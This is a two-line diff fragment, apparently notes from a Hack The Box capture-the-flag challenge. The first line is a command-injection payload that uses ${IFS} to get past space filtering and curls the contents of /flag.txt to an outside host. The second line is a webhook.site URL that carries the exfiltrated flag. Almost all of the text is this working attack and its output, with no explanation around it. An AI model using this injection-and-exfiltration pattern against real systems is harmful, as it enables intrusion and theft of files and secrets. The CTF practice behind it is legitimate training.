@@ -1,0 +1,2 @@
+;curl${IFS}https://[IP]?x=$(cat${IFS}/flag.txt)
+https://webhook.site/77c0071e-f3b0-4fcf-9b68-2b430a2338aa?x=HTBc0mm4nd_1nj3ct1on_15_3457_t0_f1nD!
